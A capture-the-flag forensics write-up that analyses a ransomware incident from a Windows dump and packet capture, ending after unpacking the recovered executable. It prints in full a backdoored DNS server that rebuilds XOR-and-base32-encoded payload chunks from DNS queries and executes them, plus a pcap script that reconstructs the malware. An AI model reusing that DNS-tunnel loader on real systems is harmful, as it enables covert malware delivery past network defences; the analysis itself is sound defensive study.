---
title: "Recovery"
date: 2025-11-07 18:30:00 +0000
categories: [Writeups, Forensics, Securinets CTF 2025]
tags: [forensics, writeup]
---

### Description

**I CAN'T REMEMBER**

### Handout

- dump/
- cap.pcapng

### Solve

We start by analyzing the `dump/` directory.

```sh
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/recovery/chal$ tree dump/
dump/
└── Users
    └── gumba
        ├── Desktop
        │   ├── desktop.ini
        │   ├── fox.jpg
        │   ├── gatt.png
        │   ├── IMPORTANT_NOTICE.txt
        │   ├── ip.txt
        │   ├── kalb.jpg
        │   ├── money.txt
        │   ├── rap.mp4
        │   └── sillyflag.png
        ├── dns100-free
        │   ├── app.py
        │   ├── data.db
        │   ├── dns_server.py
        │   ├── __pycache__
        │   │   └── dns_server.cpython-313.pyc
        │   ├── README.md
        │   ├── requirements.txt
        │   ├── static
        │   │   └── styles.css
        │   └── templates
        │       ├── base.html
        │       ├── import.html
        │       ├── index.html
        │       ├── logs.html
        │       ├── record_form.html
        │       ├── settings.html
        │       ├── test.html
        │       ├── zone_form.html
        │       └── zone.html
        ├── Downloads
        │   ├── desktop.ini
        │   ├── Git-2.51.0-64-bit.exe
        │   └── python-3.13.2-amd64.exe
        ├── Music
        │   └── desktop.ini
        ├── Pictures
        │   ├── Camera Roll
        │   │   └── desktop.ini
        │   ├── desktop.ini
        │   └── Saved Pictures
        │       └── desktop.ini
        ├── powershell_history.txt
        └── Videos
            ├── Captures
            │   └── desktop.ini
            └── desktop.ini

14 directories, 35 files
```

The `dump/` directory appears to be a recorded dump of a Windows filesystem user directory. In this case, the user is `gumba`.

Opening the `Desktop/` folder, we notice that most of the files are encrypted:

```sh
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/recovery/chal/dump/Users/gumba/Desktop$ ls
desktop.ini  gatt.png              ip.txt    money.txt  sillyflag.png
fox.jpg      IMPORTANT_NOTICE.txt  kalb.jpg  rap.mp4
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/recovery/chal/dump/Users/gumba/Desktop$ file *
desktop.ini:          data
fox.jpg:              data
gatt.png:             data
IMPORTANT_NOTICE.txt: ASCII text, with CRLF line terminators
ip.txt:               data
kalb.jpg:             data
money.txt:            data
rap.mp4:              data
sillyflag.png:        data
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/recovery/chal/dump/Users/gumba/Desktop$ cat ip.txt 
�$jY�}"؊��"�;�u�
                �}�BB):bɢ�E������P[���r�Qn!�Tr�_�b߭s���w��f��
��
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/recovery/chal/dump/Users/gumba/Desktop$ cat PORTANT_NOTICE.txt 
*** IMPORTANT NOTICE ***

Payment of 0.1Btc must be made in Bitcoin to the following wallet: bc1qa5wkgaew2dkv56kfvj49j0av5nml45x9ek9hz6

After payment, you will receive a decryption tool and instructions.

You have 72 hours to comply.
```

Indeed, as we can see from running the `file` command on all the files in the folder, no magic bytes are recognized and we confirm the files are encrypted. The only exception is the `IMPORTANT_NOTICE.txt` file that includes a request for the payment of a ransom. This is typical behaviour of a ransomware incident.

Another file in the main user directory is also readable: the `powershell_history.txt` file.

This file includes the whole powershell command history related to the incident.

```powershell
whoami
hostname
systeminfo
Get-Date
Get-ComputerInfo
ping 8.8.8.8
ping google.com
ping 1.1.1.1
tracert 8.8.8.8
tracert google.com
ipconfig
ipconfig /all
ipconfig /flushdns
nslookup google.com
nslookup 8.8.8.8
Test-NetConnection google.com -Port 443
Test-NetConnection 8.8.8.8 -Port 53
Get-NetAdapter
Get-NetIPAddress
Get-NetRoute
Get-Service
Get-Process
Get-DnsClientCache
Get-DnsClientServerAddress
netstat -ano
Set-ExecutionPolicy RemoteSigned -Force
New-Item -ItemType Directory -Path "C:\tools"
cd C:\tools
Invoke-WebRequest -Uri "https://chocolatey.org/install.ps1" -UseBasicParsing | Invoke-Expression
choco -v
choco install openssh -y
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic
Get-Service sshd
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH Port 22" -Protocol TCP -LocalPort 22 -Action Allow
ssh-keygen -t rsa -b 4096 -f $env:USERPROFILE\.ssh\id_rsa
type $env:USERPROFILE\.ssh\id_rsa.pub
mkdir C:\config
cd C:\config
New-Item -ItemType File -Path "settings.conf"
Set-Content -Path "settings.conf" -Value "Hostname=server01"
Get-Content settings.conf
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service ssh-agent
Set-Service ssh-agent -StartupType Automatic
Get-Service ssh-agent
ssh-add $env:USERPROFILE\.ssh\id_rsa
cd C:\tools
choco install git -y
git --version
git config --global user.name "Admin"
git config --global user.email "admin@example.com"
mkdir C:\repos
cd C:\repos
git clone https://github.com/youssefnoob003/dns100-free.git
cd .\dns100-free\
pip install -r .\requirements.txt
python .\app.py
New-NetFirewallRule -DisplayName "App Port 8080" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow
Get-NetFirewallRule | where DisplayName -like "*App Port*"
netstat -ano | findstr :8080
tasklist | findstr python
Set-Location C:\
Get-ChildItem -Path "C:\Users" -Recurse -ErrorAction SilentlyContinue | Out-Null
Get-EventLog -LogName System -Newest 10
Get-EventLog -LogName Application -Newest 10
Restart-Service sshd
Restart-Service ssh-agent
Test-NetConnection localhost -Port 22
Test-NetConnection google.com -Port 80
Resolve-DnsName microsoft.com
Resolve-DnsName github.com
ipconfig /displaydns
Clear-DnsClientCache
Get-WmiObject Win32_NetworkAdapterConfiguration | Select Description,IPAddress,MACAddress
Get-WmiObject Win32_OperatingSystem | Select Caption,Version,BuildNumber
Get-LocalUser
Get-LocalGroup
net user
net localgroup administrators
New-Item -ItemType Directory -Path "C:\logs"
cd C:\logs
Get-EventLog -LogName Security -Newest 5 | Out-File security_log.txt
Get-Date | Out-File timestamp.txt
(Get-Content (Get-PSReadlineOption).HistorySavePath) | Out-File "powershell_history.txt"
Compress-Archive -Path .\ -DestinationPath "C:\archive\config_backup.zip"
mkdir C:\backup
Copy-Item "C:\config\settings.conf" -Destination "C:\backup\settings_backup.conf"
Remove-Item "C:\config\settings.conf"
Rename-Item "C:\backup\settings_backup.conf" -NewName "settings.conf"
cd C:\repos\dns100-free\
git pull
python .\app.py
Get-Process | Where-Object {$_.CPU -gt 10}
Stop-Process -Name "notepad" -ErrorAction SilentlyContinue
Start-Job -ScriptBlock { ping 8.8.8.8 -t }
Get-Job
Stop-Job -Id 1
Remove-Job -Id 1
Exit
```

Overall, the attacker flow can be summarized as such:

1. Install tooling
2. Enable persistent remote access (OpenSSH + keys + firewall)
3. Clone & run a custom app
4. Enumerate host/network and collect logs/data
5. Keep services/jobs running and perform basic cleanup

The most important piece of evidence we can extract from this powershell history is the reference to the repository of the tool `dns100-free` (https://github.com/youssefnoob003/dns100-free.git). This tool exists on the dump provided but since the files have all been encrypted, we weren't able to see the actual tool source code. 

Now, we can clone the repository and inspect the python program. 

The most recent commit, however, shows that the tool is "Out of Service". 

```sh
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/recovery/dns100-free$ cat app.py 
print("Out of Service")
```

Let's analyze the commit history and try to find a version of the repository that includes the actual code.

After manually inspecting the code from each commit I notice that `dns_server.py` includes the definition of a function called `xor_bytes()` in a few of the versions. The XOR algorithm can be used for some type of encryption or obfuscation, so I looked for where this function was being called. Indeed, only one of the versions included a call to this function. That turned out to be the correct version of the repository used for the attack (commit `34465d5`).

The main program logic comes from the `dns_server.py` script.

```py
import socket
import socketserver
import threading
import time
import sqlite3
from dnslib import DNSRecord, RR, QTYPE, A, AAAA, CNAME, MX, NS, TXT, SRV, SOA, RCODE
from dnslib.dns import DNSHeader
import random
import base64
import subprocess
import tempfile
import os

def xor_bytes(data_bytes, key_byte):
    """XOR every byte with a single-byte key."""
    return bytes([b ^ key_byte for b in data_bytes])

def parse_dns_query(data):
    """Extract QNAME labels from a raw DNS query packet."""
    qname = []
    idx = 12
    length = data[idx]
    while length != 0:
        idx += 1
        qname.append(data[idx:idx+length].decode())
        idx += length
        length = data[idx]
    return qname


def ensure_db(db_path):
    conn = sqlite3.connect(db_path, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    with conn:
        conn.execute("""CREATE TABLE IF NOT EXISTS zones(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE,
            ttl INTEGER,
            primary_ns TEXT,
            admin_email TEXT,
            serial INTEGER,
            refresh INTEGER,
            retry INTEGER,
            expire INTEGER,
            minimum INTEGER
        )""")
        conn.execute("""CREATE TABLE IF NOT EXISTS records(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            zone_id INTEGER,
            name TEXT,
            type TEXT,
            content TEXT,
            ttl INTEGER DEFAULT 0,
            priority INTEGER
        )""")
        conn.execute("""CREATE TABLE IF NOT EXISTS settings(
            key TEXT PRIMARY KEY,
            value TEXT
        )""")
        conn.execute("""CREATE TABLE IF NOT EXISTS logs(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts DATETIME DEFAULT CURRENT_TIMESTAMP,
            client_ip TEXT,
            qname TEXT,
            qtype TEXT,
            rcode TEXT,
            answer TEXT,
            duration_ms INTEGER
        )""")
        conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES('listen_addr','0.0.0.0')")
        conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES('listen_port','5353')")
        conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES('default_ttl','300')")
        conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES('upstream','')")
    return conn

def bump_zone_serial(conn, zone_id):
    conn.execute("UPDATE zones SET serial=serial+1 WHERE id=?", (zone_id,))

def fetch_settings(conn):
    cur = conn.execute("SELECT key,value FROM settings")
    return {k:v for k,v in cur.fetchall()}

class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data, sock = self.request
        client_ip = self.client_address[0]
        start = time.time()
        try:
            request = DNSRecord.parse(data)
            qname = str(request.q.qname)
            qtype = QTYPE[request.q.qtype]
            reply = self.server.answer_query(request)
            sock.sendto(reply.pack(), self.client_address)
            rcode = RCODE[reply.header.rcode]
            answers = ";".join([str(r.rdata) for r in reply.rr])
        except Exception as e:
            rcode = "SERVFAIL"
            answers = str(e)
        finally:
            dur = int((time.time()-start)*1000)
            with self.server.conn:
                self.server.conn.execute(
                    "INSERT INTO logs(client_ip,qname,qtype,rcode,answer,duration_ms) VALUES(?,?,?,?,?,?)",
                    (client_ip, locals().get('qname','?'), locals().get('qtype','?'), rcode, answers, dur)
                )



def send_test_dns_query(server_ip: str, keyword: str):
    """Send a test DNS query to a selected DNS server."""
    qname = f"{keyword}.example.local"
    query = DNSRecord.question(qname, qtype="A")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(query.pack(), (server_ip, 53))
        
    except Exception as e:
        sock.close()



class DNSServer(socketserver.ThreadingUDPServer):
    allow_reuse_address = True
    def __init__(self, server_address, handler_class, db_path):
        super().__init__(server_address, handler_class)
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.special_domain = "meow"
        self.chunks = {}

    def _zone_for_qname(self, qname):
        rows = self.conn.execute("SELECT * FROM zones").fetchall()
        matches = [r for r in rows if qname.endswith(r["name"])]
        if not matches:
            return None
        return max(matches, key=lambda r: len(r["name"]))

    def _records_for(self, zone_id, name, rtype):
        rows = self.conn.execute("SELECT * FROM records WHERE zone_id=? AND name=? AND type=?",
                                 (zone_id, name, rtype)).fetchall()
        return rows

    def _all_records_name(self, zone_id, name):
        rows = self.conn.execute("SELECT * FROM records WHERE zone_id=? AND name=?",
                                 (zone_id, name)).fetchall()
        return rows

    def _soa_rr(self, zone):
        mname = zone["primary_ns"]
        rname = zone["admin_email"]
        times = (int(zone["serial"]), int(zone["refresh"]), int(zone["retry"]), int(zone["expire"]), int(zone["minimum"]))
        return RR(zone["name"], QTYPE.SOA, rdata=SOA(mname, rname, times), ttl=zone["ttl"])

    def answer_query(self, request: DNSRecord) -> DNSRecord:
        qname = str(request.q.qname)
        qtype = QTYPE[request.q.qtype]

        labels = qname.split(".")
        print(labels)
        if labels[-2] == self.special_domain:
            if labels[0] == "end":
                print("[+] Stop signal received, reconstructing file...")
                ordered = [self.chunks[i] for i in sorted(self.chunks.keys())]
                exe_bytes = b"".join(ordered)

                with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as tmp_exe:
                    tmp_exe.write(exe_bytes)
                    exe_path = tmp_exe.name

                print(f"[+] Running {exe_path}")
                subprocess.run([exe_path], check=True)
                os.unlink(exe_path)            
            elif len(labels) >= 3:
                try:
                    dns_label = labels[0]
                    index = int(labels[1])
                    padded = dns_label + "=" * ((8 - len(dns_label) % 8) % 8)
                    decoded_bytes = base64.b32decode(padded)
                    key_byte = decoded_bytes[0]
                    encrypted_chunk = decoded_bytes[1:]
                    original_bytes = xor_bytes(encrypted_chunk, key_byte)
                    self.chunks[index] = original_bytes
                    print(f"[+] Received chunk {index}, len={len(original_bytes)}")
                except Exception as e:
                    print(f"[!] Failed to decode chunk {labels}: {e}")

        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=0))

        zone = self._zone_for_qname(qname)
        if zone:
            name_rel = qname[:-len(zone["name"])].rstrip(".") if not qname == zone["name"] else ""
            owner = f"{name_rel}.{zone['name']}".lstrip(".")
            if qtype in ("SOA","ANY") and qname == zone["name"]:
                reply.add_answer(self._soa_rr(zone))
            rrs = []
            targets = [(owner, qtype)]
            if qtype == "ANY":
                recs = self._all_records_name(zone["id"], owner)
                for r in recs:
                    rr = build_rr(r, zone)
                    if rr:
                        rrs.append(rr)
            else:
                recs = self._records_for(zone["id"], owner, qtype)
                if not recs:
                    recs = self._records_for(zone["id"], owner, "CNAME")
                for r in recs:
                    rr = build_rr(r, zone)
                    if rr:
                        rrs.append(rr)

            if not rrs and qname == zone["name"] and qtype == "NS":
                rrs.append(RR(zone["name"], QTYPE.NS, rdata=NS(zone["primary_ns"]), ttl=zone["ttl"]))

            for rr in rrs:
                reply.add_answer(rr)

            if len(rrs)==0:
                reply.header.rcode = getattr(RCODE, "NXDOMAIN")
            return reply

        settings = fetch_settings(self.conn)
        upstream = settings.get("upstream","").strip()
        if upstream:
            try:
                u_host, u_port = (upstream.split(":")+["53"])[:2]
                u_port = int(u_port)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(2.5)
                s.sendto(request.pack(), (u_host, u_port))
                data, _ = s.recvfrom(4096)
                return DNSRecord.parse(data)
            except Exception:
                pass

        reply.header.rcode = getattr(RCODE, "NXDOMAIN")
        return reply

def build_rr(rec, zone):
    ttl = rec["ttl"] or zone["ttl"]
    name = rec["name"]
    t = rec["type"]
    if t == "A":
        return RR(name, QTYPE.A, rdata=A(rec["content"]), ttl=ttl)
    if t == "AAAA":
        return RR(name, QTYPE.AAAA, rdata=AAAA(rec["content"]), ttl=ttl)
    if t == "CNAME":
        target = rec["content"].rstrip(".") + "."
        return RR(name, QTYPE.CNAME, rdata=CNAME(target), ttl=ttl)
    if t == "MX":
        prio = rec["priority"] or 10
        target = rec["content"].rstrip(".") + "."
        return RR(name, QTYPE.MX, rdata=MX(target, prio), ttl=ttl)
    if t == "NS":
        target = rec["content"].rstrip(".") + "."
        return RR(name, QTYPE.NS, rdata=NS(target), ttl=ttl)
    if t == "TXT":
        return RR(name, QTYPE.TXT, rdata=TXT(rec["content"]), ttl=ttl)
    if t == "SRV":
        parts = rec["content"].split()
        if len(parts) != 4:
            return None
        priority, weight, port, target = parts
        target = target.rstrip(".") + "."
        return RR(name, QTYPE.SRV, rdata=SRV(int(priority), int(weight), int(port), target), ttl=ttl)
    return None

class DNSServerThread(threading.Thread):
    def __init__(self, db_path):
        super().__init__()
        self.db_path = db_path
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()
        try:
            conn = sqlite3.connect(self.db_path)
            conn.row_factory = sqlite3.Row
            cur = conn.execute("SELECT value FROM settings WHERE key='listen_port'")
            port = int(cur.fetchone()[0])
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"\x00", ("127.0.0.1", port))
            s.close()
        except Exception:
            pass

    def run(self):
        ensure_db(self.db_path)
        send_test_dns_query("192.168.85.175", "meow")
        conn = sqlite3.connect(self.db_path)
        cur = conn.execute("SELECT key,value FROM settings")
        settings = {k:v for k,v in cur.fetchall()}
        addr = settings.get("listen_addr","0.0.0.0")
        port = int(settings.get("listen_port","5353"))
        with DNSServer((addr, port), DNSHandler, self.db_path) as server:
            while not self._stop.is_set():
                server.handle_request()

def export_zone_to_bind(conn, zone_id):
    zone = conn.execute("SELECT * FROM zones WHERE id=?", (zone_id,)).fetchone()
    recs = conn.execute("SELECT * FROM records WHERE zone_id=? ORDER BY name,type", (zone_id,)).fetchall()
    lines = []
    lines.append(f"$ORIGIN {zone['name']}")
    lines.append(f"$TTL {zone['ttl']}")
    lines.append(f"@ IN SOA {zone['primary_ns']} {zone['admin_email']} ({zone['serial']} {zone['refresh']} {zone['retry']} {zone['expire']} {zone['minimum']})")
    for r in recs:
        ttl = r["ttl"] or ""
        pr = r["priority"] or ""
        if r["type"] in ("MX","SRV"):
            lines.append(f"{r['name']} {ttl} IN {r['type']} {pr} {r['content']}")
        else:
            lines.append(f"{r['name']} {ttl} IN {r['type']} {r['content']}")
    return "\n".join(lines) + "\n"

def import_zone_from_bind(conn, text):
    origin = None
    ttl_default = 300
    primary_ns = None
    admin_email = None
    serial= int(time.time())
    refresh=3600; retry=600; expire=86400; minimum=300
    records = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith(";"):
            continue
        if line.startswith("$ORIGIN"):
            origin = line.split()[1].rstrip(".") + "."
            continue
        if line.startswith("$TTL"):
            ttl_default = int(line.split()[1])
            continue
        parts = line.split()
        if "SOA" in parts:
            i = parts.index("SOA")
            primary_ns = parts[i+1].rstrip(".") + "."
            admin_email = parts[i+2]
            tail = " ".join(parts[i+3:]).replace("("," ").replace(")"," ").split()
            if len(tail) >= 5:
                serial, refresh, retry, expire, minimum = map(int, tail[:5])
            continue
        name = parts[0]
        if name == "@":
            name = origin
        rtype = parts[-2]
        content = parts[-1]
        ttl = 0
        priority = None
        if rtype in ("MX","SRV") and len(parts) >= 5:
            priority = int(parts[-2]) if rtype == "MX" else int(parts[-3])
            content = " ".join(parts[-1:]) if rtype=="MX" else " ".join(parts[-2:])
        records.append((name, rtype, content, ttl, priority))
    with conn:
        conn.execute("""INSERT INTO zones(name, ttl, primary_ns, admin_email, serial, refresh, retry, expire, minimum)
                        VALUES(?,?,?,?,?,?,?,?,?)""",
                     (origin, ttl_default, primary_ns, admin_email, serial, refresh, retry, expire, minimum))
        zid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
        for (name, rtype, content, ttl, pr) in records:
            conn.execute("""INSERT INTO records(zone_id,name,type,content,ttl,priority) VALUES(?,?,?,?,?,?)""",
                         (zid, name, rtype, content, ttl, pr))
    return zid
```

The python script is a threaded UDP DNS server (with a small SQLite-backed zone store) that also implements a DNS-based covert channel: it accepts base32-encoded DNS labels containing XOR-encrypted chunks of a binary, reconstructs the binary when signaled, writes it to a temp file, and executes it. This is similar to a DNS tunneling/exfiltration attack which has several advantages for the attacker:

- DNS queries often pass firewalls and are allowed by default, making a covert channel robust.
- Label-based encoding allows arbitrary data to be transported in many small pieces.
- Using the authoritative server (or a server under attacker control) avoids packet inspection by stacking payload into query labels.

This is where we start looking at the network capture `cap.pcapng`.

In the protocol hierarchy we notice an unusual high amount of DNS packets. Filtering the protocol for `dns` in wireshark allows us to see the DNS queries made by `192.168.85.175` (hardcoded) with the reference to a special domain `meow` (hardcoded).

We also notice that some of these packets are being considered malformed. The reason that is happening is because the length of the DNS label (given by the first byte of the label) is 66 (0x42), which exceeds the allowed length for such label.

> Length: Each label can theoretically be from 0 to 63 characters in length. In practice, a length of 1 to about 20 characters is most common, with a special exception for the label assigned to the root of the tree.

Our goal now is to reconstruct the `.exe` file (the malware) by following the implementation of `dns_server.py` with the data from the chunks of the packets. Initially, we reconstruct only the first chunk, since that's where we will find the correct magic bytes if we decrypt correctly. 

Recall the implementation of the reconstruction:

```py
dns_label = labels[0]
    index = int(labels[1])
    padded = dns_label + "=" * ((8 - len(dns_label) % 8) % 8)
    decoded_bytes = base64.b32decode(padded)
    key_byte = decoded_bytes[0]
    encrypted_chunk = decoded_bytes[1:]
    original_bytes = xor_bytes(encrypted_chunk, key_byte)
    self.chunks[index] = original_bytes
```

We take the DNS label bytes and split them, ending up with the encoded bytes of the first chunk: `EBWXVMBAEMQCAIBEEAQCBX67EAQJQIBAEAQCAIBAMAQCAIBAEAQCAIBAEAQCAIBAEA`.

We take this chunk and `base32` decode. In hex format, it results in: `20 6d 7a b0 20 23 20 20 20 24 20 20 20 df df 20 20 98 20 20 20 20 20 20 20 60 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20`.

![]()
The first byte is our `xor_key`: `0x20`.

We use this `xor_key` to decrypt the chunk and end up with: `00 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00`.

> A DOS header has the following ignature: the first two bytes are `4D 5A ("MZ")`, the initials of Mark Zbikowski, which identifies the file as a DOS executable.

This confirms that we correctly decrypted the first chunk and we can move on to do the same on all the other packets and reconstruct the malware by index.

```py
import base64, os, sys
from scapy.all import rdpcap, UDP

def xor_bytes(data, key): return bytes(b ^ key for b in data)

def parse_labels(raw):
    if len(raw) <= 12: return []
    labels, pos = [], 12
    while pos < len(raw):
        L = raw[pos]
        if L == 0: break
        pos += 1
        if pos + L > len(raw): break
        labels.append(raw[pos:pos+L].decode(errors="ignore"))
        pos += L
    return labels

def process_pcap(path, special_domain="meow", out_file="reconstructed.exe"):
    recon = {}
    queries = []
    for pkt in rdpcap(path):
        if UDP in pkt and pkt[UDP].dport == 53:
            raw = bytes(pkt[UDP].payload)
            labels = parse_labels(raw)
            if not labels: continue
            queries.append(".".join(labels))
            if labels[-1] != special_domain: continue
            if labels[0] == "end":
                if not recon: continue
                ordered = [recon[i] for i in sorted(recon.keys())]
                exe = b"".join(ordered)
                with open(out_file, "wb") as f: f.write(exe)
                print(f"[+] Reconstructed -> {out_file}")
            elif len(labels) >= 3:
                try:
                    dns_label = labels[0]
                    idx = int(labels[1])
                    padded = dns_label + "=" * ((8 - len(dns_label) % 8) % 8)
                    decoded = base64.b32decode(padded)
                    key, chunk = decoded[0], decoded[1:]
                    recon[idx] = xor_bytes(chunk, key)
                    print(f"[+] Chunk {idx} ({len(chunk)} bytes)")
                except Exception as e:
                    print(f"[!] Failed chunk {labels}: {e}")

    with open("dns_queries.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(queries))
    print(f"[+] Saved {len(queries)} queries, collected {len(recon)} chunks.")

if __name__ == "__main__":
    pcap = sys.argv[1] if len(sys.argv) > 1 else "cap.pcapng"
    process_pcap(pcap, special_domain="meow", out_file="reconstructed.exe")
```

```sh
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/recovery/chal$ file reconstructed.exe 
reconstructed.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows, UPX compressed
```

The `reconstructed.exe` file is a PE32 executable but it's UPX compressed. In order to reverse engineer the malware, we must decompress it.

```sh
shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/recovery/chal$ upx -d reconstructed.exe -o uncompressed.exe 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     50176 <-     27136   54.08%    win32/pe     uncompressed.exe

Unpacked 1 file.

shieda@pop-os:~/Desktop/CTFs/securinetsctf2025/recovery/chal$ file uncompressed.exe 
uncompressed.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
```






